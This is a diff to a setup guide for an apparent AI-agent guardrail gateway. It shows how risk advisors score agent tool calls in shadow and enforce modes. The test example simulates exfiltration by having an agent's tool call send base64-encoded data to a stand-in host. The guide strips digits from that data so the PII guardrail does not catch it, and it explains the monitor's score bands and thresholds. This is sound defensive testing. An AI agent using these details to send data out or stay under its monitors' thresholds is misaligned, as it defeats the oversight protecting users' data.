@@ -35,19 +35,39 @@ GW=$(docker compose exec -T guardrail-gateway sh -c '. /bootstrap/dev.env; echo 
 guard() { curl -s localhost:8100/v1/guard/tool -H "X-API-Key: $GW" -H 'Content-Type: application/json' -d "$1"; }
 ```
 
+Advisors only run in the **uncertain bands** (elevated and high). A low-risk request doesn't need
+them, and a critical one is decided without them, so the example has to land in between. It's a
+GET to a host the agent has never used, smuggling data out in its query string. Each call uses a
+new host and session, so you can run it again. The query has no digits on purpose: the PII
+guardrail reads a run of digits as a phone number and blocks the call before any advisor is asked.
+
+```bash
+Q=$(python3 -c "import base64,re;print(re.sub(r'[0-9=]','',base64.urlsafe_b64encode(b'quarterly revenue by region '*24).decode()))")
+send() {  # $1 = query string, or empty for the control request
+  H=$(tr -dc a-z </dev/urandom | head -c 8)
+  guard "{\"agent_id\":\"research-agent\",\"action\":\"http.post\",\"session_id\":\"s-$H\",
+    \"payload\":{\"tool_call\":{\"name\":\"http.post\",\"arguments\":
+      {\"url\":\"https://cdn-$H.example.net/p.gif$1\",\"method\":\"GET\"}}}}" \
+    | jq '{outcome, risk: .risk.score, band: .risk.band, mode: .risk.mode, codes: .reason_codes}'
+}
+advisors() {  # the agent never sees advisor output, in any mode: read it from the audit record
+  docker compose exec -T postgres psql -U gateway -d gateway -At -c \
+    "select risk->'advisors' from audit.audit_events order by created_at desc limit 1" | jq .
+}
+```
+
 ### Check 1: shadow by default (nothing changes, the answer is recorded)
 
 ```bash
-guard '{"agent_id": "research-agent", "action": "http.post", "session_id": "s1",
-  "data_classification": "PII",
-  "payload": {"tool_call": {"name": "http.post", "arguments":
-    {"url": "https://paste.example.net/x?d=AAAA", "method": "POST", "body": "export"}}}}' | jq '{outcome, risk: .risk.score, mode: .risk.mode, codes: .reason_codes, advisors: .risk.advisors}'
+send "?d=$Q"; advisors      # encoded data in the query
+send "";      advisors      # the same call without it (control)
 ```
 
-The default `RISK_MODE=shadow` means `mode: "shadow"` and the outcome is unchanged, but
-`risk.advisors` lists the local advisor's answer for each question. (`risk.advisors` is in the API
-response here because shadow mode returns the full assessment; in enforce mode the agent would not
-see it — only the audit record would.)
+The default `RISK_MODE=shadow` gives `mode: "shadow"` and band `elevated` (score 50 for a fresh
+`research-agent`), and the outcome is `allow` either way. The audit record shows the local
+advisor's answers: for the first call the `exfiltration` question is `suspicious` (about 0.55) with
+`shadow_points` of about 3; for the control both questions are `benign`. The API response never
+includes advisor output, in shadow or enforce mode.
 
 ### Check 2: an advisor tightening a decision (enforce)
 
@@ -58,14 +78,25 @@ until curl -sf localhost:8100/ready >/dev/null; do sleep 2; done
 GW=$(docker compose exec -T guardrail-gateway sh -c '. /bootstrap/dev.env; echo $DEMO_GATEWAY_API_KEY')
 ```
 
-Re-run the Check 1 request. Now the local advisor's points push the request higher and, if it asks
-for verification, the outcome becomes `verify` (HTTP 202) with `ADVISOR_RISK` among the reason
-codes — never `ADVISOR_*` naming the advisor. A plain, low-risk call is still allowed:
+Re-run Check 1 (`send "?d=$Q"` and `send ""`). Now the advisor's points count: the first call
+scores a few points higher than the control and carries `ADVISOR_RISK` among its reason codes,
+never a code naming the advisor. It stays `allow` here, because the local model only adds points
+(its `verify_at` is 1.0) and 50 plus a few is still elevated. With more points (up to the `cap`)
+a request near the top of a band crosses into `high`, where the table asks for verification.
+
+A low-risk call skips advisors entirely (score 15 for a fresh `research-agent`, band `low`, and
+no `advisors` in its audit record):
 
 ```bash
-guard '{"agent_id": "research-agent", "action": "kb.search", "session_id": "s2",
-  "payload": {"tool_call": {"name": "kb.search", "arguments": {"q": "refund policy"}}}}' | jq .outcome   # "allow" (advisors skip low risk)
+curl -s localhost:8100/v1/guard/input -H "X-API-Key: $GW" -H 'Content-Type: application/json' \
+  -d '{"agent_id": "research-agent", "action": "llm.chat", "session_id": "s-low",
+       "payload": {"text": "Summarise our refund policy"}}' | jq '{outcome, band: .risk.band}'
+advisors    # prints nothing: no advisor ran
 ```
+
+Scores depend on history: every blocked request adds to an agent's `REPEATED_DENIALS` penalty for
+a few days, and an unknown action (one that isn't in the tenant's action catalog) scores 100. If
+your numbers are higher than these, that's why; use an agent with a clean history.
 
 ### Check 3: the pilot analytics
 
@@ -97,7 +128,7 @@ curl -s -X PUT localhost:8200/cp/v1/tenants/demo/advisor-policy -H "X-Admin-Key:
 
 | Check | Pass when |
 | --- | --- |
-| Shadow | decisions unchanged; `risk.advisors` records each answer |
+| Shadow | decisions unchanged; the audit record's `risk.advisors` has each answer and the `shadow_points` |
 | Enforce | the advisor can raise risk / ask to verify, never permit; the agent never sees the advisor |
 | Band | low-risk requests skip advisors entirely |
 | Policy | a hosted advisor is skipped until the tenant opts in for the data class |
@@ -110,5 +141,8 @@ curl -s -X PUT localhost:8200/cp/v1/tenants/demo/advisor-policy -H "X-Admin-Key:
 | gateway won't start: "unknown advisor provider" | a typo in `ADVISORS_JSON`'s `provider` |
 | gateway won't start: "must start with ADVISOR_SECRET_" | an `http` advisor's `auth_env` names a non-`ADVISOR_SECRET_*` variable |
 | advisor always `no signal` | the endpoint is slow (raise `timeout_ms`), unreachable, or returns a non-conforming body |
+| no advisor answers in the audit record | the request was `low` or `critical` (advisors only run for elevated and high), or a guardrail or the policy refused it first |
+| `GUARDRAIL_BLOCK` with `PHONE_NUMBER` on a test URL | digits in the URL look like a phone number to the PII guardrail; use letters only |
+| outcome `hold` with `RISK_CRITICAL` on a simple call | the action isn't in the tenant's action catalog (scores 100), or the agent has a `REPEATED_DENIALS` penalty |
 | hosted advisor always `skipped_policy` | the tenant hasn't opted in for the request's data class |
 | turning on a tenant policy returns 422 | a live gateway is older than 0.9 (no `advisors_v1` capability) |
